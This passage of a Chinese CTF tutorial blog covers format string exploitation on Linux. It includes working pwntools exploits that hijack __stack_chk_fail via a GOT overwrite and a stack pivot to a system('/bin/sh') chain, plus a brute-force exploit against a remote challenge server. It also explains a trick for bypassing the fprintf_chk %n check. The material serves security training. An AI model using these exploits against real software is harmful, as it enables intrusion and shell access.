<p>我们发现只要栈上存在一个有 <strong>2 跳</strong>的 ebp链就可以构<strong>造栈上相对地址写原语</strong>：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-format-string-exploit/images/0687bb65b40467b6627c8c2f18f10f6e.png"
                      alt="在这里插入图片描述"
                ></p>
<p>由于我们有了<strong>栈上相对地址写原语</strong>，因此可以进一步构造<strong>任意地址写原语</strong>：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-format-string-exploit/images/3d51466d90ad3db8c92f52a22ce01fca.png"
                      alt="在这里插入图片描述"
                ><br>有了任意地址读写后就考虑如何劫持程序执行流程。</p>
<p>由于格式化字符串函数在一个死循环里面且格式化字符串漏洞无法再一次循环中写入完整地址，因此不能通过直接栈上写 ROP 的方式劫持程序执行流程。</p>
<p>但是由于本题的 RELRO 保护为 Partial RELRO ，可以改 got 表，并且开启 canary 保护，因此我们可以考虑修改 <code>__stack_chk_fail@got</code> ，然后再修改 canary 调用 <code>__stack_chk_fail</code> 函数劫持程序执行流程。</p>
<p>最直接的方法是在 <code>__stack_chk_fail@got</code> 上写 one_gadget 。不过这里有一个更通用的方法，那就是通过栈迁移到栈上的 ROP 完成 get shell 。</p>
<p>我们利用 IDAPython 脚本在 libc 中搜索合适的栈迁移 gadget 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">from</span> idaapi <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"></span><br><span class="line">start_ea = <span class="literal">None</span></span><br><span class="line">end_ea = <span class="literal">None</span></span><br><span class="line">max_len = <span class="number">10</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, addr, asms, val</span>):</span><br><span class="line">        <span class="variable language_">self</span>.addr = addr</span><br><span class="line">        <span class="variable language_">self</span>.asms = asms</span><br><span class="line">        <span class="variable language_">self</span>.val = val</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">for</span> seg <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">        <span class="keyword">if</span> idc.get_segm_name(seg) == <span class="string">&#x27;.text&#x27;</span>:</span><br><span class="line">            start_ea = idc.get_segm_start(seg)</span><br><span class="line">            end_ea = idc.get_segm_end(seg)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">assert</span> start_ea != <span class="literal">None</span></span><br><span class="line">    fp = <span class="built_in">open</span>(<span class="string">&quot;rop.txt&quot;</span>, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">    gadgets = []</span><br><span class="line">    i = start_ea</span><br><span class="line">    <span class="keyword">while</span> i &lt; end_ea:</span><br><span class="line">        asm = idc.generate_disasm_line(i, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> asm.startswith(<span class="string">&quot;add     esp, &quot;</span>):</span><br><span class="line">            asms = [asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>)]</span><br><span class="line">            val = idc.get_operand_value(i, <span class="number">1</span>)</span><br><span class="line">            j = i + get_item_size(i)</span><br><span class="line">            <span class="keyword">while</span> j &lt; end_ea:</span><br><span class="line">                asm = idc.generate_disasm_line(j, <span class="number">0</span>).split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">                asms.append(asm.replace(<span class="string">&quot;     &quot;</span>, <span class="string">&quot; &quot;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(asms) &gt; max_len: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;rsp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;esp&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;leave&quot;</span> <span class="keyword">in</span> asm <span class="keyword">or</span> <span class="string">&quot;call&quot;</span> <span class="keyword">in</span> asm: <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;push&quot;</span>: val -= <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;pop&quot;</span>: val += <span class="number">4</span></span><br><span class="line">                <span class="keyword">if</span> print_insn_mnem(j) == <span class="string">&quot;retn&quot;</span>:</span><br><span class="line">                    gadgets.append(Gadget(i, asms, val))</span><br><span class="line">                    gadget = Gadget(i, asms, val)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val))</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;&quot;</span>)</span><br><span class="line">                    j += get_item_size(j)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                j += get_item_size(j)</span><br><span class="line">            i = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += get_item_size(i)</span><br><span class="line">    gadgets = <span class="built_in">sorted</span>(gadgets, key=<span class="keyword">lambda</span> gadget: gadget.val)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;_________________________________________&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(gadgets))</span><br><span class="line">    <span class="keyword">for</span> gadget <span class="keyword">in</span> gadgets:</span><br><span class="line">        fp.write(<span class="string">&quot;val: &quot;</span> + <span class="built_in">hex</span>(gadget.val) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        fp.write(<span class="built_in">hex</span>(gadget.addr) + <span class="string">&quot; : &quot;</span> + <span class="string">&quot;; &quot;</span>.join(gadget.asms) + <span class="string">&quot;;\n&quot;</span>)</span><br><span class="line">    fp.close()</span><br></pre></td></tr></table></figure></div>
<p>最终找到了一个可以将 esp 加 0x100 的 gadget 。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xa08c9 : add esp, 100h; sub eax, edx; retn;</span><br></pre></td></tr></table></figure></div>
<p>我们只需要再栈迁移的目标地址上利用栈上相对地址写原语写入 ROP 即可。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed6_patch&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">n16 = <span class="keyword">lambda</span> x: (x + <span class="number">0x10000</span>) &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;f5b: &quot;</span>, <span class="string">&quot;%2$p||%37$p&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;||&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc base: &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">stack_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x55</span> * <span class="number">4</span></span><br><span class="line">log.success(<span class="string">&quot;stack: &quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_offset_write</span>(<span class="params">offset, value</span>):</span><br><span class="line">    <span class="keyword">assert</span> (stack_addr &amp; <span class="number">0xFFFF</span>) + offset &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) <span class="keyword">and</span> value &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;f5b: &#x27;</span>, <span class="string">&#x27;%&#123;&#125;c%37$hn&#x27;</span>.<span class="built_in">format</span>((stack_addr + offset) &amp; <span class="number">0xFFFF</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;f5b: &#x27;</span>, <span class="string">&#x27;%&#123;&#125;c%85$hn&#x27;</span>.<span class="built_in">format</span>(value))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>):</span><br><span class="line">    <span class="keyword">assert</span> address &lt; (<span class="number">1</span> &lt;&lt; <span class="number">32</span>) <span class="keyword">and</span> value &lt; (<span class="number">1</span> &lt;&lt; <span class="number">16</span>)</span><br><span class="line">    arbitrary_offset_write(<span class="number">0x30</span> * <span class="number">4</span>, address &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">    arbitrary_offset_write((<span class="number">0x30</span> * <span class="number">4</span> + <span class="number">2</span>) &amp; <span class="number">0xFFFF</span>, address &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;f5b: &#x27;</span>, <span class="string">&#x27;%&#123;&#125;c%48$hn&#x27;</span>.<span class="built_in">format</span>(value &amp; <span class="number">0xFFFF</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_esp_ret = libc.search(asm(<span class="string">&#x27;add esp, 0x100; sub eax, edx; ret;&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">arbitrary_address_write(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>], add_esp_ret &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">arbitrary_address_write(elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>] + <span class="number">2</span>, add_esp_ret &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">arbitrary_offset_write(<span class="number">0x43</span> * <span class="number">4</span>, system_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">arbitrary_offset_write(<span class="number">0x43</span> * <span class="number">4</span> + <span class="number">2</span>, system_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line">arbitrary_offset_write(<span class="number">0x45</span> * <span class="number">4</span>, bin_sh_addr &amp; <span class="number">0xFFFF</span>)</span><br><span class="line">arbitrary_offset_write(<span class="number">0x45</span> * <span class="number">4</span> + <span class="number">2</span>, bin_sh_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *&#123;&#125;&#x27;.format(hex(add_esp_ret)))</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">arbitrary_offset_write(<span class="number">0x1c</span>, <span class="number">0x1</span>)  <span class="comment"># change canary to call the __stack_chk_fail</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h3 id="例题：2019-xman-format"><a href="#例题：2019-xman-format" class="headerlink" title="例题：2019 xman format"></a>例题：2019 xman format</h3><p><a class="link"   href="https://gitcode.net/qq_45323960/buuoj/-/tree/master/xman_2019_format" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>同样是格式化字符串。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">sub_8048651</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *buf; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">  buf = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x100</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x37</span>u);</span><br><span class="line">  call_vuln(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>但与上一题不同的是这次的格式化字符串是离线操作，不能泄露地址。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *format; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;...&quot;</span>);</span><br><span class="line">  v1 = strtok(buf, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(v1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    format = strtok(<span class="number">0</span>, <span class="string">&quot;|&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !format )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(format);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外还有一个后门函数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>由于不能泄露地址，因此只能爆破 ebp 链指向返回地址然后写返回地址为 <code>backdoor</code> 函数地址来 get shell 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-format-string-exploit/images/18604cf96259f2a470423e854a4785a0.png"
                      alt="在这里插入图片描述"
                ></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./xman_2019_format&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">start = <span class="keyword">lambda</span>: remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">25559</span>)  <span class="comment"># process([elf.path])</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">global</span> p</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = start()</span><br><span class="line">        <span class="comment"># gdb.attach(p, &quot;b *0x080485F6\nb *0x8048606&quot;)</span></span><br><span class="line">        <span class="comment"># pause()</span></span><br><span class="line">        payload = <span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x9c</span>) + <span class="string">&quot;c%10$hhn|%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x85ab</span>) + <span class="string">&quot;c%18$hn&quot;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;...&#x27;</span>, payload)</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        p.sendline(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">        p.recvline_contains(<span class="string">&#x27;flag&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        p.close()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure></div>

<h2 id="fprintf-chk-绕过"><a href="#fprintf-chk-绕过" class="headerlink" title="fprintf_chk 绕过"></a>fprintf_chk 绕过</h2><p><code>fprintf_chk</code> 执行 <code>%n</code> 会报错,检测逻辑（<code>glibc2.23</code>）。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">LABEL(form_number) : <span class="keyword">if</span> (s-&gt;_flags2 &amp; _IO_FLAGS2_FORTIFY) &#123;                                     \</span><br><span class="line">    <span class="keyword">if</span> (!readonly_format) &#123;                                                                     \</span><br><span class="line">        <span class="keyword">extern</span> <span class="type">int</span> __readonly_area(<span class="type">const</span> <span class="type">void</span> *, <span class="type">size_t</span>)                                        \</span><br><span class="line">                attribute_hidden;                                                               \</span><br><span class="line">        readonly_format = __readonly_area(format, ((STR_LEN(format) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(CHAR_T)));    \</span><br><span class="line">    &#125;                                                                                           \</span><br><span class="line">    <span class="keyword">if</span> (readonly_format &lt; <span class="number">0</span>)                                                                    \</span><br><span class="line">        __libc_fatal(<span class="string">&quot;*** %n in writable segment detected ***\n&quot;</span>);                              \</span><br><span class="line">&#125;      </span><br></pre></td></tr></table></figure></div>
<p><code>__readonly_area</code> 会通过 <code>fopen</code> 打开 <code>/proc/self/maps</code> 来判断 <code>format</code> 是否是只读段。也就是说只有 <code>format</code> 的内存只读的时候才能有 <code>%n</code> ，从而避免了通过修改 <code>format</code> 实现任意地址写。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __readonly_area(<span class="type">const</span> <span class="type">char</span> *ptr, <span class="type">size_t</span> size) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">void</span> *ptr_end = ptr + size;</span><br><span class="line"></span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;/proc/self/maps&quot;</span>, <span class="string">&quot;rce&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">/* It is the system administrator&#x27;s choice to not have /proc</span></span><br><span class="line"><span class="comment">	 available to this process (e.g., because it runs in a chroot</span></span><br><span class="line"><span class="comment">	 environment.  Don&#x27;t fail in this case.  */</span></span><br><span class="line">        <span class="keyword">if</span> (errno == ENOENT</span><br><span class="line">            <span class="comment">/* The kernel has a bug in that a process is denied access</span></span><br><span class="line"><span class="comment">	     to the /proc filesystem if it is set[ug]id.  There has</span></span><br><span class="line"><span class="comment">	     been no willingness to change this in the kernel so</span></span><br><span class="line"><span class="comment">	     far.  */</span></span><br><span class="line">            || errno == EACCES)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need no locking.  */</span></span><br><span class="line">    __fsetlocking(fp, FSETLOCKING_BYCALLER);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *line = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">size_t</span> linelen = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof_unlocked(fp)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (_IO_getdelim(&amp;line, &amp;linelen, <span class="string">&#x27;\n&#x27;</span>, fp) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *p;</span><br><span class="line">        <span class="type">uintptr_t</span> from = strtoul(line, &amp;p, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p == line || *p++ != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> *q;</span><br><span class="line">        <span class="type">uintptr_t</span> to = strtoul(p, &amp;q, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (q == p || *q++ != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from &lt; (<span class="type">uintptr_t</span>) ptr_end &amp;&amp; to &gt; (<span class="type">uintptr_t</span>) ptr) &#123;</span><br><span class="line">            <span class="comment">/* Found an entry that at least partially covers the area.  */</span></span><br><span class="line">            <span class="keyword">if</span> (*q++ != <span class="string">&#x27;r&#x27;</span> || *q++ != <span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (from &lt;= (<span class="type">uintptr_t</span>) ptr &amp;&amp; to &gt;= (<span class="type">uintptr_t</span>) ptr_end) &#123;</span><br><span class="line">                size = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (from &lt;= (<span class="type">uintptr_t</span>) ptr)</span><br><span class="line">                size -= to - (<span class="type">uintptr_t</span>) ptr;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (to &gt;= (<span class="type">uintptr_t</span>) ptr_end)</span><br><span class="line">                size -= (<span class="type">uintptr_t</span>) ptr_end - from;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                size -= to - from;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!size)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">free</span>(line);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* If the whole area between ptr and ptr_end is covered by read-only</span></span><br><span class="line"><span class="comment">     VMAs, return 1.  Otherwise return -1.  */</span></span><br><span class="line">    <span class="keyword">return</span> size == <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>结构体 <code>__IO_FILE</code> 利用 <code>_fileno</code> 存储该文件的文件描述符。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">_IO_FILE * _IO_file_open (_IO_FILE *fp, <span class="type">const</span> <span class="type">char</span> *filename, <span class="type">int</span> posix_mode, <span class="type">int</span> prot, <span class="type">int</span> read_write, <span class="type">int</span> is32not64) &#123;</span><br><span class="line">    <span class="type">int</span> fdesc;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _LIBC</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fp-&gt;_flags2 &amp; _IO_FLAGS2_NOTCANCEL))</span><br><span class="line">        fdesc = open_not_cancel (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fdesc = open (filename, posix_mode | (is32not64 ? <span class="number">0</span> : O_LARGEFILE), prot);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    fdesc = open (filename, posix_mode, prot);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (fdesc &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    fp-&gt;_fileno = fdesc;</span><br><span class="line">    _IO_mask_flags (fp, read_write,_IO_NO_READS+_IO_NO_WRITES+_IO_IS_APPENDING);</span><br><span class="line">    <span class="keyword">if</span> ((read_write &amp; (_IO_IS_APPENDING | _IO_NO_READS)) == (_IO_IS_APPENDING | _IO_NO_READS)) &#123;</span><br><span class="line">        _IO_off64_t new_pos = _IO_SYSSEEK (fp, <span class="number">0</span>, _IO_seek_end);</span><br><span class="line">        <span class="keyword">if</span> (new_pos == _IO_pos_BAD &amp;&amp; errno != ESPIPE) &#123;</span><br><span class="line">	        close_not_cancel (fdesc);</span><br><span class="line">	        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    _IO_link_in ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line">    <span class="keyword">return</span> fp;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (_IO_file_open)</span><br></pre></td></tr></table></figure></div>
<p>如果控制 <code>seccomp</code> 让 <code>open</code> 函数返回 0 就会使 <code>__readonly_area</code> 程序从标志输入中读取数据进行判断,此时只需要输入 <code>000000000000-7fffffffffff r-xp 00000000 00:00 0 /bin/vm</code> 即可绕过 <code>%n</code> 检测。</p>
<h3 id="例题：2019-中国技能大赛-pwn2"><a href="#例题：2019-中国技能大赛-pwn2" class="headerlink" title="例题：2019 中国技能大赛 pwn2"></a>例题：2019 中国技能大赛 pwn2</h3><p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2019%E4%B8%AD%E5%9B%BD%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B_pwn2" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>edit</code> 函数可以编辑 <code>rule</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.modify the rule.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.modify the chunk.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input yout choice: &quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;input the size&quot;</span>);</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(v2 - <span class="number">1</span>) &lt;= <span class="number">0xDF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;input your content&quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, rule, v2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v1 == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s no use.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>set</code> 功能可以把 <code>rule</code> 设应用到沙箱。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">set</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int16 v1; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *v2; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  v1 = <span class="number">11</span>;</span><br><span class="line">  v2 = rule;</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2LL</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>add</code> 功能有 <code>__fprintf_chk</code> 的格式化字符串漏洞，并且如果 <code>random_num</code> 的值为 0x30 则可以泄露基址。</p>
